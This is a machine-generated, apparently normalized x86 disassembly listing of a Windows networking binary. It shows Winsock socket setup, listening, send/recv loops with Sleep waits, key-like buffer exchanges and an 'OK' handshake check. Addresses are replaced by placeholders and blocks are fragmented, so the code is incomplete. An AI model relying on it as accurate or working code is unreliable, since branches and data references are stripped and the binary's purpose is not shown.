pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0xa ] 0x2
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x2745
je r-xdata
imul ebx ebx 0x3e8
mov ecx ebx
mov eax 0x10624dd3
imul ecx
sar edx 0x6
mov ebx edx
shr ebx 0x1f
xor edi edi
add ebx edx
mov [ ebp + 0x14 ] ecx
mov [ ebp + 0x18 ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push 0x0
sub eax edi
push eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + ecx ]
push edx
push eax
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
cmp edi 0x4
jne r-xdata
add edi esi
jmp r-xdata
jns r-xdata
add edi esi
jmp r-xdata
mov eax [ ebp + 0x18 ]
add eax ebx
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x14 ]
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi [ ebp + 0x10 ]
jne r-xdata
push ebx
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406a10
push ebp
mov ebp esp
push 0xffffffff
push sub_412b81
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
push 0x18
mov [ esi + 0x8 ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_40a4e9
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
mov [ ebp - 0x2c ] r--data
call sub_40aef3
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
push 0x18
mov [ esi + 0x28 ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_40a4e9
push r--data
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] r--data
call sub_40aef3
int3
mov [ esi + 0x24 ] eax
mov [ eax ] eax
mov eax [ esi + 0x24 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x24 ]
mov [ eax + 0x8 ] eax
mov edx [ esi + 0x24 ]
mov [ edx + 0x14 ] 0x1
mov eax [ esi + 0x24 ]
mov [ eax + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x2
push 0x18
mov [ esi + 0x38 ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_40a4e9
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_40aef3
mov [ esi + 0x34 ] eax
mov [ eax ] eax
mov eax [ esi + 0x34 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x34 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx + 0x14 ] 0x1
mov edx [ esi + 0x34 ]
mov [ edx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x3
push 0x18
mov [ esi + 0x48 ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0x44 ] eax
mov [ eax ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x44 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x4
push 0x18
mov [ esi + 0x58 ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_40a4e9
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_40aef3
mov [ esi + 0x54 ] eax
mov [ eax ] eax
mov eax [ esi + 0x54 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x54 ]
mov [ eax + 0x8 ] eax
mov edx [ esi + 0x54 ]
mov [ edx + 0x14 ] 0x1
mov eax [ esi + 0x54 ]
mov [ eax + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x5
lea edi [ esi + 0x74 ]
push 0x8
mov [ edi ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_40a4e9
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_40aef3
mov [ edi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ edi ]
mov [ ecx ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x8c ]
push 0x8
mov [ edi ] ebx
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_40a4e9
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_40aef3
mov [ edi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ edi ]
mov [ edx ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
push 0x24
mov [ ebp - 0x4 ] 0x7
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
movzx edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] dx
mov edx [ ecx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
movzx edx [ ecx + 0xa ]
mov [ eax + 0xa ] dx
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ecx + 0x20 ]
mov [ eax + 0x20 ] edx
mov ecx [ ecx + 0x10 ]
mov [ eax + 0x10 ] ecx
jmp r-xdata
xor edi edi
mov edx [ esi + 0xa8 ]
mov eax [ edx ]
add eax 0x2
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
je r-xdata
push 0xc
mov [ esi + 0xa8 ] eax
call sub_40a3e1
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
mov [ esi + 0x60 ] edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x1
push eax
call sub_40a006
add esp 0x8
mov [ edi ] eax
jmp r-xdata
sub_406d50
push ebp
mov ebp esp
push 0xffffffff
push sub_412af8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_4093b0
mov eax [ edi + 0x4 ]
push eax
call sub_40a0eb
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_406dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_412c99
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x7
mov esi [ edi + 0x60 ]
test esi esi
je r-xdata
mov eax [ edi + 0xa8 ]
push eax
call sub_40a0eb
mov esi [ edi + 0xa4 ]
add esp 0x4
test esi esi
je r-xdata
mov eax [ esi ]
push eax
call sub_409fcc
push esi
call sub_40a0eb
add esp 0x8
mov edx [ edi + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
mov ecx [ edi + 0x44 ]
mov esi [ ecx + 0x4 ]
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov ecx edi
call sub_4091e0
mov esi [ esi ]
push ebx
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
push esi
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x44 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x44 ]
mov [ eax ] eax
mov eax [ edi + 0x44 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x48 ] 0x0
mov ecx [ edi + 0x54 ]
mov esi [ ecx + 0x4 ]
cmp [ esi + 0x15 ] 0x0
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x10 ] esi
jne r-xdata
lea ecx [ ecx ]
push eax
call sub_409fcc
mov ecx [ esi + 0x4 ]
push ecx
call sub_409fcc
add esp 0x8
mov eax [ ebx + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov [ eax ] eax
mov eax [ ebx + 0x4 ]
mov [ eax + 0x8 ] eax
lea esi [ edi + 0x8c ]
mov [ ebx + 0x8 ] 0x0
call sub_4092d0
mov eax [ esi ]
push eax
call sub_40a0eb
mov [ esi ] 0x0
add esp 0x4
lea esi [ edi + 0x74 ]
call sub_4092d0
mov eax [ esi ]
push eax
call sub_40a0eb
add esp 0x4
mov [ esi ] 0x0
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x8
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax ebx
call sub_4093b0
mov ebx [ ebx + 0x4 ]
push ebx
call sub_40a0eb
lea ebx [ edi + 0x40 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_4093b0
mov ebx [ ebx + 0x4 ]
push ebx
call sub_40a0eb
lea ebx [ edi + 0x30 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_4093b0
mov ebx [ ebx + 0x4 ]
push ebx
call sub_40a0eb
lea ebx [ edi + 0x20 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0xb
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_4093b0
mov ebx [ ebx + 0x4 ]
push ebx
call sub_40a0eb
mov eax [ edi + 0x10 ]
add esp 0x4
xor esi esi
cmp eax esi
je r-xdata
lea ecx [ ecx ]
mov edx [ esi + 0x8 ]
push edx
lea ecx [ edi + 0x40 ]
call sub_4091e0
mov eax [ ebp - 0x10 ]
mov esi [ esi ]
push eax
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
je r-xdata
mov [ edi + 0x10 ] esi
mov [ edi + 0x14 ] esi
mov [ edi + 0x18 ] esi
mov [ ebp - 0x4 ] 0xc
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax edi
call sub_4093b0
mov ecx [ edi + 0x4 ]
push ecx
call sub_40a0eb
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_40a0eb
add esp 0x4
mov edx [ esi + 0x8 ]
push edx
mov ecx ebx
call sub_4091e0
mov eax [ ebp - 0x10 ]
mov esi [ esi ]
push eax
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
je r-xdata
sub_407060
push ebx
push esi
push 0x24
mov esi eax
call sub_40a3e1
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
movzx edx [ esi + 0x8 ]
mov [ eax + 0x8 ] dx
mov ecx [ esi + 0x18 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x14 ] ecx
movzx edx [ esi + 0xa ]
mov [ eax + 0xa ] dx
mov ecx [ esi + 0xc ]
mov [ eax + 0xc ] ecx
mov edx [ esi + 0x20 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0x10 ]
mov [ eax + 0x10 ] ecx
jmp r-xdata
xor esi esi
mov edx [ edi + 0x10 ]
mov eax [ edx ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
cmp eax ebx
je r-xdata
push 0xc
mov [ edi + 0x10 ] eax
call sub_40a3e1
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
xor eax eax
pop esi
mov [ edi + 0x8 ] eax
mov eax edi
pop ebx
retn
mov eax [ edi + 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
cmp eax ebx
je r-xdata
push 0xc
mov [ edi + 0xc ] esi
call sub_40a3e1
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
push 0x1
push eax
call sub_40a006
add esp 0x8
mov [ esi ] eax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop esi
mov eax edi
pop ebx
retn
push 0x1
push eax
call sub_40a006
add esp 0x8
mov [ esi ] eax
sub_407130
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x2000
call sub_40a3e1
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx eax
call sub_401000
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0xc ] esi
mov edi esi
mov esi edx
shl esi 0x5
add esi [ ebp - 0x4 ]
mov edi edx
mov [ ebp - 0xc ] edi
jmp r-xdata
push esi
call sub_40a079
mov ebx eax
mov [ ebp - 0xc ] edx
call sub_40a058
cdq
mov ecx 0x989680
idiv ecx
add edx ebx
push edx
call sub_40a046
add esp 0x8
call sub_40a058
cdq
mov ecx 0x60
idiv ecx
cmp edx 0x7f
ja r-xdata
xor eax eax
cmp edi 0x7f
ja r-xdata
push 0x8
call sub_40a3e1
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov edx [ ebx + 0x60 ]
mov eax [ edx ]
xor esi esi
mov [ eax ] edi
mov [ ebp + 0x8 ] esi
lea ebx [ ebx ]
push eax
call sub_40a0eb
add esp 0x4
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x8 ]
lea eax [ edi + 0x80 ]
shl eax 0x5
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp esi 0x4
je r-xdata
add esi eax
mov eax ebx
jmp r-xdata
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0xa4 ]
mov ecx [ eax + 0x4 ]
push 0x20
push ecx
xor esi esi
call sub_405fa0
mov [ ebp + 0x8 ] esi
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
mov [ ebp + 0x8 ] eax
cmp eax 0x64
jl r-xdata
mov ebx [ ebp + 0x8 ]
mov [ ebx + 0xa4 ] eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push 0x1
push 0x20
call sub_40a006
mov edi eax
push 0x1
push 0x20
mov [ ebx ] edi
call sub_40a006
mov [ ebx + 0x4 ] eax
mov ecx 0x8
[ edi ] [ esi ]
mov esi [ ebp - 0x8 ]
mov edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
mov edi [ ebp - 0xc ]
add esp 0x10
cmp esi 0x20
je r-xdata
add esi eax
mov edx [ ebx + 0x60 ]
mov eax [ edx ]
mov edi [ ebp + 0xc ]
push 0x0
mov ecx 0x4
sub ecx esi
push ecx
add eax esi
push eax
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
xor esi esi
mov [ ebp + 0x8 ] esi
push 0x64
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
mov [ ebp + 0x8 ] eax
cmp eax 0x64
jl r-xdata
cmp esi 0x2
je r-xdata
add esi eax
mov eax [ ebx + 0xa4 ]
mov ecx [ eax + 0x4 ]
push 0x0
mov edx 0x20
sub edx esi
push edx
add ecx esi
push ecx
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
mov edx [ ebx + 0x60 ]
mov eax [ edx ]
push 0x2
push eax
mov eax [ ebx + 0xa4 ]
call sub_405fa0
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
push 0x2
push edx
push r--data
call sub_40a901
add esp 0xc
pop edi
test eax eax
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x64
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
mov [ ebp + 0x8 ] eax
cmp eax 0x64
jl r-xdata
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
push 0x0
mov edx 0x2
sub edx esi
push edx
add ecx esi
push ecx
push edi
call [ recv@IAT ]
test eax eax
jle r-xdata
sub_407340
push ebp
mov ebp esp
push 0xffffffff
push sub_412bdb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x1e0 ] edi
mov [ ebp - 0x230 ] edi
mov [ ebp - 0x22c ] edi
mov [ ebp - 0x228 ] edi
lea eax [ ebp - 0x1b0 ]
push eax
push 0x202
mov [ ebp - 0x4 ] edi
call [ WSAStartup@IAT ]
lea esp [ esp ]
mov esi ebx
call sub_4083a0
mov [ ebx + 0x6c ] eax
cmp eax edi
jbe r-xdata
push eax
push ebx
call sub_407130
test al al
jne r-xdata
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax [ ebx + 0x6c ]
push 0x1
push 0x64
push 0x2
push edx
push eax
call sub_4066d0
add esp 0x14
cmp eax 0x2
jne r-xdata
mov ecx [ ebx + 0xa8 ]
mov edx [ ecx + 0x10 ]
push edx
call [ Sleep@IAT ]
mov eax [ ebx + 0x6c ]
push eax
call [ closesocket@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_409fbd
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov ax [ edx ]
mov ecx 0x2
push r--data
mov [ ebx + 0x70 ] ax
mov [ ebp - 0x20 ] cx
call [ inet_addr@IAT ]
push 0x6
push 0x1
xor edx edx
push 0x2
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1e ] dx
call [ socket@IAT ]
mov esi eax
push 0x10
lea eax [ ebp - 0x20 ]
push eax
push esi
mov [ ebp - 0x1dc ] esi
call [ bind@IAT ]
lea ecx [ ebp - 0x1f0 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
push esi
mov [ ebp - 0x1f0 ] 0x10
call [ getsockname@IAT ]
mov eax [ ebx + 0xa8 ]
mov cx [ ebp - 0x1e ]
push 0x1f4
push esi
mov [ eax + 0x8 ] cx
call [ listen@IAT ]
lea edx [ ebp - 0x21c ]
push edx
push 0x8004667e
push esi
mov [ ebp - 0x21c ] 0x1
call [ ioctlsocket@IAT ]
mov [ ebp - 0x1c1 ] 0x0
mov esi 0x1
mov esi [ ebx + 0x14 ]
sub esi [ ebx + 0x10 ]
sar esi 0x1
inc esi
jmp r-xdata
xor ecx ecx
mov eax esi
mov edx 0x8
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_409fb2
mov ecx [ ebx + 0x6c ]
mov [ eax ] ecx
mov edi 0x1
xor ecx ecx
add esp 0x4
mov edx edi
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x1c1 ] 0x1
mov [ eax + 0x4 ] dx
mov [ eax + 0x6 ] cx
cmp [ ebp - 0x1d0 ] ecx
jle r-xdata
mov eax [ ebp - 0x1d4 ]
push eax
call sub_40a0eb
add esp 0x4
cmp [ ebp - 0x1c1 ] 0x0
mov [ ebp - 0x1d8 ] esi
je r-xdata
cmp [ ebp - 0x1d8 ] edi
jle r-xdata
mov edx 0x3
mov [ eax + 0x4 ] dx
mov edx [ ebp - 0x1d8 ]
mov edi [ ebp - 0x1d4 ]
push edx
mov ecx 0xea60
mov edx edi
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jg r-xdata
mov esi [ ebp - 0x1d4 ]
add esi 0xe
lea esp [ esp ]
movzx eax [ edi + 0x6 ]
test al 0x20
jne r-xdata
jns r-xdata
mov eax [ ebx + 0x10 ]
movzx ecx [ eax + edi * 2 - 0x2 ]
lea edx [ ebp - 0x1b8 ]
mov eax ebx
mov [ ebp - 0x1b8 ] ecx
call sub_4090c0
mov edx [ eax ]
mov [ esi - 0x6 ] edx
mov [ esi - 0x2 ] 0x1
inc edi
add esi 0x8
cmp edi [ ebp - 0x1d8 ]
jl r-xdata
mov eax [ ebp - 0x1d4 ]
push eax
call sub_40a0eb
add esp 0x4
mov ecx ebx
call sub_408460
test al al
je r-xdata
test al 0x2
je r-xdata
jne r-xdata
call sub_40aa97
cmp [ eax ] 0xb
jne r-xdata
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax [ ebx + 0x6c ]
push 0x1
push 0x64
push 0x2
push edx
push eax
call sub_4066d0
add esp 0x14
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x1d4 ]
test [ eax + 0x6 ] 0x1
je r-xdata
lea ecx [ ebx + 0x8c ]
call sub_409140
lea ecx [ ebx + 0x74 ]
mov [ ebp - 0x1b8 ] eax
call sub_409140
mov ecx [ ebp - 0x1b8 ]
mov edx [ ecx ]
mov eax [ eax ]
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_405fa0
lea ecx [ ebx + 0x8c ]
call sub_409140
lea ecx [ ebx + 0x74 ]
mov [ ebp - 0x1b8 ] eax
call sub_409140
mov ecx [ ebp - 0x1b8 ]
mov edx [ ecx ]
mov eax [ eax ]
mov ecx [ ebp - 0x1d4 ]
push 0x0
push 0xa
push edx
mov edx [ ecx ]
push eax
push edx
call sub_4068c0
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebx + 0x84 ]
mov [ ebp - 0x1d0 ] eax
cmp eax 0xa
jge r-xdata
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov edx [ ebx + 0x6c ]
push 0x1
push 0x1e
push 0xc
push ecx
push edx
call sub_4066d0
add esp 0x14
test eax eax
jle r-xdata
test esi esi
cmp [ ebp - 0x1d0 ] 0xa
jge r-xdata
mov ecx [ ebx + 0xa8 ]
mov edx [ ecx ]
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov edi [ ebp - 0x1d4 ]
push 0x0
push 0xa
add edx 0x2
push edx
mov edx [ edi ]
push ecx
push edx
call sub_4066d0
mov esi eax
add esp 0x14
test esi esi
je r-xdata
js r-xdata
push eax
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov eax [ ebx + 0xa4 ]
push ecx
call sub_405fa0
mov edx [ ebx + 0x60 ]
mov eax [ edx ]
push 0xc
push r--data
push eax
call sub_40a901
add esp 0xc
test eax eax
jne r-xdata
mov edi 0x1
cmp [ ebp - 0x1d8 ] edi
jle r-xdata
jns r-xdata
lea ecx [ ebx + 0x74 ]
call sub_409140
mov eax [ eax ]
push eax
call sub_409fcc
mov eax [ ebx + 0x84 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax 0x4b4f
mov [ edx ] ax
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax [ ebx + 0xa4 ]
push 0x2
push edx
call sub_405fa0
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov eax [ ebx + 0x6c ]
mov edx 0x2
mov [ ebp - 0x1b8 ] ecx
mov [ ebp - 0x208 ] dx
push 0x1
mov ecx 0x7530
lea edx [ ebp - 0x20c ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x1d0 ] 0x2
mov [ ebp - 0x20c ] eax
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
mov eax [ ebp - 0x1d4 ]
test [ eax + edi * 8 + 0x6 ] 0x1
je r-xdata
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov eax [ ebx + 0xa4 ]
push esi
push ecx
call sub_405fa0
cmp esi 0xc
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
xor edx edx
mov edx [ ebx + 0x7c ]
inc [ ebx + 0x80 ]
add edx edx
add edx edx
cmp edx [ ebx + 0x80 ]
ja r-xdata
test [ ebp - 0x206 ] 0x2
je r-xdata
inc edi
cmp edi [ ebp - 0x1d8 ]
jge r-xdata
mov ecx [ ebx + 0xa8 ]
mov edx [ ecx ]
add edx 0x2
push edx
call sub_40a9c1
mov ecx [ ebx + 0x10 ]
mov dx [ ecx + edi * 2 - 0x2 ]
add esp 0x4
mov [ eax ] dx
mov ecx [ ebx + 0xa8 ]
mov edx [ ecx ]
push 0x0
push 0x2
mov [ ebp - 0x1b4 ] eax
add eax 0x2
push edx
push eax
mov [ ebp - 0x1d0 ] eax
mov eax [ ebp - 0x1d4 ]
mov ecx [ eax + edi * 8 ]
push ecx
call sub_4066d0
mov esi eax
add esp 0x14
test esi esi
jns r-xdata
mov ecx [ ebx + 0x60 ]
mov eax [ ecx ]
movzx edi [ eax ]
mov [ ebp - 0x1ec ] eax
xor eax eax
test di di
sete al
lea edx [ esi - 0x2 ]
mov [ ebp - 0x1cc ] edx
lea edx [ ebp - 0x1b8 ]
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1b8 ] eax
lea eax [ ebx + 0x20 ]
call sub_4090c0
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebx + 0x60 ]
mov eax [ edx ]
push esi
push r--data
push eax
call sub_40a901
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebx + 0x94 ]
inc [ ebx + 0x98 ]
add esi esi
add esi esi
cmp esi [ ebx + 0x98 ]
ja r-xdata
xor edx edx
xor edx edx
mov [ ebx + 0x80 ] edx
jmp r-xdata
xor edi edi
mov edi edi
jmp r-xdata
jle r-xdata
mov edx [ ebp - 0x1d0 ]
mov esi 0x1
mov [ edx ] 0x0
jmp r-xdata
movzx edi [ ebp - 0x1c8 ]
lea edx [ ebp - 0x1c0 ]
lea eax [ ebx + 0x20 ]
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1c0 ] edi
call sub_4090c0
add esi 0xfffffffe
add [ eax ] esi
lea edx [ ebp - 0x1c0 ]
mov eax ebx
mov [ ebp - 0x1c0 ] edi
call sub_4090c0
cmp [ eax ] 0x0
ja r-xdata
movzx ecx di
lea edx [ ebp - 0x1b8 ]
lea eax [ ebx + 0x20 ]
mov [ ebp - 0x1b8 ] ecx
call sub_4090c0
mov [ eax ] 0x0
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax 0x4b4f
mov [ edx ] ax
mov ecx [ ebx + 0x60 ]
mov edx [ ecx ]
mov eax [ ebx + 0xa4 ]
push 0x2
push edx
call sub_405fa0
mov eax [ ebx + 0x60 ]
mov ecx [ eax ]
mov eax [ edi ]
